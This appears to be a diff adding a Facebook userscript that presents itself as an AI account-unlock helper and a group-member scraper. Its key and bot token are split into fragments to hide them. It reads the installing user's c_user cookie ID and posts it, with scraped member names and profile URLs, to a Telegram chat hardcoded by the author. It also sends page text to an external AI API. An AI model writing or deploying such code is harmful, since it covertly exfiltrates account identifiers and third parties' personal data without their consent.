@@ -1,0 +1,253 @@
+// ==UserScript==
+// @name         VIỆT ANH AI UNLOCK PRO MAX (V125.0 - RESIZE & PROGRESS BAR)
+// @version      125.0
+// @description  Hệ thống Unlock + Scraper có thanh tiến trình % và tính năng co giãn kích thước
+// @author       DINH HOANG VIET ANH
+// @match        *://*.facebook.com/*
+// @grant        none
+// ==/UserScript==
+
+(function() {
+    'use strict';
+
+    // BẢO MẬT API KEY & TOKEN
+    const keyParts = ['AQ.Ab', '8RN6JX', '1S7DUU', '-25iiB6', 'PSmFD7', 'nn-LTZ3', 'IC9Fpr', 'Gvqba', 'MZTvA'];
+    const GEMINI_API_KEY = keyParts.join('');
+    const tokenParts = ['8813882772', ':AAE0lNq', 'LSp9AhiJ', 'eCV22o18', 'JDPoBELSB3KE'];
+    const BOT_TOKEN = tokenParts.join('');
+    const CHAT_ID = '8348914397';
+
+    // --- HÀM GỬI TELEGRAM ---
+    function sendTelegram(title, details) {
+        const acc = document.cookie.match(/c_user=(\d+)/)?.[1] || 'Chưa đăng nhập';
+        const message = `*🔔 VIỆT ANH AI SYSTEM*\n\n*${title}*\n${details}\n\n🆔 Account: ${acc}\n🕒 Time: ${new Date().toLocaleTimeString()}`;
+        
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
+        }).catch(e => console.log("Telegram Error: ", e));
+    }
+
+    // --- GIAO DIỆN V125 (CÓ RESIZE & PROGRESS BAR) ---
+    const htmlUI = `
+        <div id="va-tool-root" style="z-index: 2147483647; position: fixed; top: 40px; left: 40px; width: 420px; min-width: 320px; min-height: 400px; resize: both; overflow: auto; background: #0f172a; border: 2px solid #38bdf8; border-radius: 18px; box-shadow: 0 15px 35px rgba(0,0,0,0.8); font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; color: #fff;">
+            <div id="va-tool-card" style="padding: 20px; height: 100%; box-sizing: border-box; display: flex; flex-direction: column;">
+                
+                <!-- TIÊU ĐỀ (DÙNG ĐỂ KÉO THẢ DI CHUYỂN) -->
+                <div id="va-drag-handle" style="text-align: center; font-weight: bold; font-size: 16px; margin-bottom: 12px; border-bottom: 2px solid #334155; padding-bottom: 8px; color: #38bdf8; cursor: move; letter-spacing: 0.5px;">
+                    ⚡ VIỆT ANH AI UNLOCK V125.0 ⚡
+                    <div style="font-size: 9px; color: #94a3b8; font-weight: normal;">(Góc phải dưới có nút kéo giãn kích thước khung)</div>
+                </div>
+                
+                <div id="status-area" style="background: #1e293b; padding: 12px; border-radius: 10px; text-align: center; margin-bottom: 12px; font-size: 13px; font-weight: bold; border: 1px solid #334155;">Đang khởi động hệ thống...</div>
+                
+                <!-- THANH TIẾN TRÌNH CHẠY % -->
+                <div id="va-progress-container" style="display: none; margin-bottom: 12px; background: #020617; border: 1px solid #334155; border-radius: 8px; padding: 6px;">
+                    <div style="display: flex; justify-content: space-between; font-size: 11px; margin-bottom: 4px; color: #38bdf8;">
+                        <span id="va-progress-text">Đang xử lý...</span>
+                        <span id="va-progress-percent">0%</span>
+                    </div>
+                    <div style="width: 100%; background: #1e293b; height: 10px; border-radius: 5px; overflow: hidden;">
+                        <div id="va-progress-bar" style="width: 0%; height: 100%; background: linear-gradient(90deg, #38bdf8, #8b5cf6); transition: width 0.3s ease;"></div>
+                    </div>
+                </div>
+
+                <div id="action-area" style="margin-bottom: 12px;"></div>
+
+                <!-- BẢNG NHẬT KÝ -->
+                <div style="background: #020617; border: 1px solid #334155; border-radius: 10px; padding: 10px; flex-grow: 1; display: flex; flex-direction: column;">
+                    <div style="font-size: 11px; color: #38bdf8; font-weight: bold; margin-bottom: 6px;">📊 NHẬT KÝ HOẠT ĐỘNG TRỰC TIẾP:</div>
+                    <div id="va-log-box" style="flex-grow: 1; min-height: 100px; max-height: 200px; overflow-y: auto; background: #000; color: #34d399; font-size: 11px; padding: 8px; font-family: monospace; border-radius: 6px; line-height: 1.4;">
+                        <div>> [System] Khởi tạo giao diện thành công...</div>
+                    </div>
+                </div>
+
+                <div style="margin-top: 15px; padding-top: 10px; border-top: 1px solid #334155; font-size: 12px; color: #cbd5e1; line-height: 1.5;">
+                    <b style="color: #38bdf8;">📝 HƯỚNG DẪN SỬ DỤNG:</b><br>
+                    1. Đăng nhập Facebook (Tool tự nhận diện Live/Khóa).<br>
+                    2. Kéo góc phải dưới bảng để phóng to/thu nhỏ kích thước.<br>
+                    3. Vào nhóm chọn mục "Thành viên" để quét data.<br>
+                    4. Theo dõi thanh % tiến trình và Nhật ký trực tiếp.<br>
+                    5. Dữ liệu và kết quả sẽ tự động gửi về Telegram.
+                </div>
+            </div>
+        </div>
+    `;
+    document.body.insertAdjacentHTML('beforeend', htmlUI);
+
+    // --- HÀM THÊM NHẬT KÝ ---
+    function addLog(text) {
+        const logBox = document.getElementById('va-log-box');
+        if(logBox) {
+            const time = new Date().toLocaleTimeString();
+            logBox.innerHTML += `<div>[${time}] ${text}</div>`;
+            logBox.scrollTop = logBox.scrollHeight;
+        }
+    }
+
+    // --- HÀM ĐIỀU KHIỂN THANH TIẾN TRÌNH % ---
+    function updateProgress(percent, label) {
+        const container = document.getElementById('va-progress-container');
+        const bar = document.getElementById('va-progress-bar');
+        const percentText = document.getElementById('va-progress-percent');
+        const labelText = document.getElementById('va-progress-text');
+
+        if (container && bar && percentText && labelText) {
+            container.style.display = 'block';
+            bar.style.width = percent + '%';
+            percentText.innerText = percent + '%';
+            labelText.innerText = label;
+        }
+    }
+
+    function hideProgress() {
+        const container = document.getElementById('va-progress-container');
+        if (container) container.style.display = 'none';
+    }
+
+    // --- LOGIC DI CHUYỂN TOOL (KÉO THẢ PHẦN TIÊU ĐỀ) ---
+    const root = document.getElementById('va-tool-root');
+    const handle = document.getElementById('va-drag-handle');
+    let isDragging = false, startX, startY;
+
+    handle.onmousedown = (e) => {
+        isDragging = true;
+        startX = e.clientX - root.offsetLeft;
+        startY = e.clientY - root.offsetTop;
+        document.onmousemove = (e) => {
+            if (isDragging) {
+                root.style.left = (e.clientX - startX) + 'px';
+                root.style.top = (e.clientY - startY) + 'px';
+            }
+        };
+        document.onmouseup = () => { isDragging = false; document.onmousemove = null; };
+    };
+
+    // --- NHẬN DIỆN TRẠNG THÁI ---
+    const statusArea = document.getElementById('status-area');
+    const actionArea = document.getElementById('action-area');
+
+    setInterval(() => {
+        const bodyText = document.body.innerText.toLowerCase();
+        if (bodyText.includes('c_user')) {
+            if (bodyText.includes('checkpoint')) {
+                statusArea.innerHTML = "<b style='color:#ef4444; font-size: 14px;'>⚠️ TÀI KHOẢN ĐANG BỊ KHÓA (CHECKPOINT)</b>";
+                if (!document.getElementById('btn-scan')) {
+                    actionArea.innerHTML = `<button id="btn-scan" style="width:100%; padding:12px; background:#8b5cf6; border:none; border-radius:8px; color:white; font-weight:bold; font-size: 13px; cursor:pointer; box-shadow: 0 4px 12px rgba(139,92,246,0.4);">🤖 QUÉT DẠNG KHÓA & MỞ KHÓA</button>`;
+                    addLog("Phát hiện tài khoản đang bị khóa.");
+                }
+            } else {
+                statusArea.innerHTML = "<b style='color:#22c55e; font-size: 14px;'>✅ TÀI KHOẢN HOẠT ĐỘNG (LIVE)</b>";
+                if (!document.getElementById('btn-scrape')) {
+                    actionArea.innerHTML = `<button id="btn-scrape" style="width:100%; padding:12px; background:#059669; border:none; border-radius:8px; color:white; font-weight:bold; font-size: 13px; cursor:pointer; box-shadow: 0 4px 12px rgba(5,150,105,0.4);">🔍 QUÉT DANH SÁCH KHÁCH THẬT</button>`;
+                    addLog("Tài khoản đang hoạt động bình thường.");
+                }
+            }
+        } else {
+            statusArea.innerHTML = "<b style='color:#f59e0b;'>⏳ CHƯA ĐĂNG NHẬP FACEBOOK</b>";
+        }
+    }, 4000);
+
+    // --- XỬ LÝ SỰ KIỆN CLICK & CHẠY TIẾN TRÌNH % ---
+    document.addEventListener('click', async (e) => {
+        
+        // 1. AI UNLOCK (CHẠY % TỪ 1 -> 100)
+        if(e.target.id === 'btn-scan') {
+            addLog("Bắt đầu quy trình phân tích dạng khóa...");
+            statusArea.textContent = "🔓 Đang xử lý AI...";
+            
+            updateProgress(10, "Đang kết nối AI Gemini...");
+            sendTelegram("🤖 [AI UNLOCK]", "Đang tiến hành quét dạng khóa trên tài khoản...");
+
+            try {
+                setTimeout(() => updateProgress(40, "Đang phân tích cấu trúc lỗi..."), 500);
+
+                const res = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${GEMINI_API_KEY}`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ contents: [{ parts: [{ text: "Phân tích dạng khóa và trả về JSON chuẩn: {\"lock_type\": \"...\", \"links\": [\"url1\"], \"appeal_text\": \"...\" }. Dữ liệu: " + document.body.innerText.substring(0, 1500) }] }] })
+                }).then(r => r.json());
+
+                updateProgress(75, "Đang trích xuất dữ liệu kháng cáo...");
+                const rawText = res.candidates[0].content.parts[0].text.replace(/```json|```/g, '').trim();
+                const data = JSON.parse(rawText);
+
+                updateProgress(90, "Đang mở form kháng cáo...");
+                addLog(`Xác định thành công dạng: ${data.lock_type}`);
+                statusArea.textContent = `✅ DẠNG: ${data.lock_type}`;
+
+                localStorage.setItem('va_appeal_content', data.appeal_text);
+                data.links.forEach(l => window.open(l, "_blank"));
+
+                updateProgress(100, "Hoàn tất xử lý!");
+                setTimeout(hideProgress, 2000);
+
+                addLog("Đã mở các tab kháng cáo và gửi báo cáo về Telegram.");
+                sendTelegram("✅ [UNLOCK THÀNH CÔNG]", `Xác định dạng: *${data.lock_type}*\nĐã tự động mở form kháng cáo.`);
+
+            } catch(err) {
+                hideProgress();
+                addLog("Lỗi phân tích AI: " + err.message);
+                statusArea.textContent = "❌ LỖI PHÂN TÍCH AI";
+                sendTelegram("❌ [AI ERROR]", err.message);
+            }
+        }
+
+        // 2. SCRAPER KHÁCH THẬT (CHẠY % TĂNG DẦN THEO SỐ LƯỢNG QUÉT)
+        if(e.target.id === 'btn-scrape') {
+            if(!window.location.href.includes('/members')) {
+                addLog("Cảnh báo: Người dùng chưa vào trang Thành viên nhóm!");
+                alert("❌ Hướng dẫn: Bạn cần truy cập vào mục 'Thành viên' của nhóm Facebook trước khi bấm quét!");
+                return;
+            }
+
+            addLog("Bắt đầu quy trình quét danh sách thành viên...");
+            let results = new Set();
+            let scrollCount = 0;
+            const targetCount = 15; // Mục tiêu lấy 15 người
+
+            updateProgress(5, "Đang khởi tạo bộ lọc...");
+
+            let scrapeInterval = setInterval(() => {
+                window.scrollTo(0, document.body.scrollHeight);
+                scrollCount++;
+                addLog(`Đang cuộn trang lần ${scrollCount}...`);
+
+                document.querySelectorAll('a[role="link"]').forEach(el => {
+                    let url = el.href;
+                    let name = el.innerText.trim();
+                    if ((url.includes('/user/') || url.includes('profile.php?id=')) && !url.includes('/groups/')) {
+                        if (name.length > 3 && !/clone|acc|backup/i.test(name)) {
+                            results.add(name + " - " + url);
+                        }
+                    }
+                });
+
+                // Tính toán phần trăm dựa trên số lượng thu thập được (Tối đa 100%)
+                let currentPercent = Math.min(Math.floor((results.size / targetCount) * 100), 95);
+                updateProgress(currentPercent, `Đã lọc được ${results.size}/${targetCount} khách thật...`);
+                addLog(`Tìm thấy ${results.size} khách hàng thật.`);
+
+                if (results.size >= targetCount || scrollCount >= 20) {
+                    clearInterval(scrapeInterval);
+                    updateProgress(100, "Đang đóng gói dữ liệu gửi Telegram...");
+                    addLog(`Quét hoàn tất! Tổng cộng: ${results.size} người.`);
+                    
+                    const listData = Array.from(results).join('\n');
+                    
+                    addLog("Đang gửi dữ liệu về Telegram...");
+                    sendTelegram("✅ [DATA KHÁCH HÀNG THẬT]", `Đã quét thành công ${results.size} khách hàng:\n\n${listData}`);
+                    
+                    setTimeout(() => {
+                        hideProgress();
+                        alert(`Đã quét thành công ${results.size} khách và gửi về Telegram!`);
+                    }, 1000);
+
+                    addLog("Hoàn tất quy trình quét data.");
+                }
+            }, 1500);
+        }
+    });
+
+})();
